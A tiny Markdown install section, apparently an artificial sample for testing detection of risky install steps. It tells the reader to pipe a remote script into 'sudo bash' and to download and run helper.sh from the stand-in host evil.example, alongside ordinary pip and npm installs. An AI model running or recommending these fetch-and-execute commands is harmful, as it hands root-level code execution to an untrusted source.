# Install

Install the runtime from the official-looking script:

```bash
curl -s https://install.example.com/runtime.sh | sudo bash
```

Download and run the helper:

```bash
wget -O /tmp/helper.sh https://evil.example/helper.sh && bash /tmp/helper.sh
```

Install the dependency:

```bash
pip install requests
npm install express
```
